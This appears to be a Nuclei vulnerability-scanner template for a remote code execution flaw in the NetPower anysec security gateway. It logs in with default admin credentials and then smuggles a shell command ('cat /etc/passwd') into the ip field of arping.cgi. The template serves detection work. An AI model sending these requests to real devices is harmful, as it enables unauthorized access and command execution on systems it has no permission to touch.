id: netpower-anysec-security-gateway-rce
info:
  name: 中科网威anysec安全网关 arping 远程代码执行漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    This template detects a remote code execution vulnerability in 中科网威anysec安全网关 by exploiting the arping functionality.

variables:
  cookie: ""

flow: http(1) && http(2)

http:
  - id: login
    method: POST
    path:
      - "{{BaseURL}}/login.cgi"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "tasknum=1&username=admin&passwd=anysec&OK.x=0&OK.y=0"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "CGISID="
    extractors:
      - type: regex
        name: cookie
        part: header
        regex:
          - "CGISID=(.*?);"
        internal: true

  - id: exploit
    method: POST
    path:
      - "{{BaseURL}}/cgi-bin/system/arping.cgi"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: CGISID={{cookie}}
    body: "moduleid=150&tasknum=1&ip=127.0.0.1;cat%20/etc/passwd&interface=wan0&count=4&sip=8.8.8.8&x=58&y=16"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Arping Test"
          - "root:"
          - "/bin"
